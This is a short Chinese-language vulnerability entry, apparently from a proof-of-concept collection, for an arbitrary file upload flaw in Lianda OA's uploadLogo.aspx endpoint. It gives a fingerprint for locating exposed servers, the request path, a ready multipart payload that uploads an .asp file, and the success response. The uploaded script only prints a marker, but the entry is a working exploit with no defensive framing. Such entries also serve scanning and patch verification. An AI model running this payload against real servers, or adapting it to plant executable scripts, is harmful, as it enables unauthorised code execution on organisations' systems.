# 联达OAuploadLogo接口存在任意文件上传漏洞

联达OAuploadLogo接口 ｜ 文件上传 ｜ —
- **指纹**：`app="联达OA"`
- **请求**：`POST /Hosp_Portal/uploadLogo.aspx HTTP/1.1`

**Payload**
```
--------------------------6wfsbxegy05kfjqibpgn
Content-Disposition: form-data; name="DesignId"
1
--------------------------6wfsbxegy05kfjqibpgn
Content-Disposition: form-data; name="Filedata";filename="dudesuite.asp"
<%
response.write("dudesuite")
%>
--------------------------6wfsbxegy05kfjqibpgn--
```
- **响应特征**：200